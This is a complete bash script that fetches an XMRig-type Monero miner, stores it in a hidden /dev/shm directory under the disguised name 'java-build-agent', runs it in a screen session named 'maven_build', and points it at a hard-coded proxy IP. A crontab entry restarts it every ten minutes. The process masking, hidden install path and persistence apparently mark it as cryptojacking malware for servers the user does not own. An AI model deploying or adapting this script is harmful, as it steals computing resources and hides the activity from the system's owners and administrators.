#!/bin/bash

# --- CONFIGURATION ---
PROXY_IP="176.65.139.42"
PROXY_PORT="8443"

# DYNAMIC NAMING: This sets the name to "Cores-[Number]-[Hostname]"
# Example: Cores-8-vps-admin
CPU_CORES=$(nproc)
WORKER_NAME="Cores-${CPU_CORES}-$(hostname)"

# Mining Specs
THREADS=8
DONATE=1

INSTALL_DIR="/dev/shm/.sys-config"
BIN_NAME="java-build-agent"
BIN_PATH="$INSTALL_DIR/$BIN_NAME"
SESSION_NAME="maven_build"
ARCH=$(uname -m)

# 1. CHECK IF ALREADY RUNNING
if screen -list | grep -q "$SESSION_NAME"; then
    echo "Worker is already running. Exiting."
    exit 0
fi

# 2. CHECK IF ALREADY DOWNLOADED
if [ ! -f "$BIN_PATH" ]; then
    echo "Setting up environment: Downloading binaries..."
    
    # OS Dependency Check
    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -y && apt-get install -y screen cron wget tar
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y screen cronie wget tar
        systemctl enable crond && systemctl start crond
    fi

    mkdir -p "$INSTALL_DIR"

    # Architecture Detection
    if [ "$ARCH" = "x86_64" ]; then
        URL="https://github.com/HashVault/vltrig/releases/download/v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz"
    else
        URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-aarch64.tar.gz"
    fi

    wget -qO- "$URL" | tar -xzf - -C "$INSTALL_DIR" --strip-components=1
    
    # Rename to mask process
    [ -f "$INSTALL_DIR/vltrig" ] && mv "$INSTALL_DIR/vltrig" "$BIN_PATH"
    [ -f "$INSTALL_DIR/xmrig" ] && mv "$INSTALL_DIR/xmrig" "$BIN_PATH"
    chmod +x "$BIN_PATH"
else
    echo "Binaries already present. Skipping download."
fi

# 3. OPTIMIZATION: ENABLE HUGE PAGES (Requires Root)
sysctl -w vm.nr_hugepages=128 >/dev/null 2>&1

# 4. START COMMAND
# nice -n 19 ensures the system stays responsive
START_CMD="nice -n 19 $BIN_PATH -o $PROXY_IP:$PROXY_PORT -u $WORKER_NAME --tls --threads=$THREADS --keepalive --donate-level $DONATE"

# 5. LAUNCH SINGLE INSTANCE
screen -d -m -S $SESSION_NAME bash -c "$START_CMD"

# 6. PERSISTENCE (Crontab auto-check every 10 mins)
(crontab -l 2>/dev/null | grep -v "$SESSION_NAME"; echo "*/10 * * * * screen -list | grep -q $SESSION_NAME || screen -d -m -S $SESSION_NAME bash -c '$START_CMD'") | crontab -

echo "------------------------------------------"
echo "Status: Connected to Proxy $PROXY_IP"
echo "Threads: $THREADS"
echo "Worker ID: $WORKER_NAME"
echo "Monitor: screen -r $SESSION_NAME"
echo "------------------------------------------"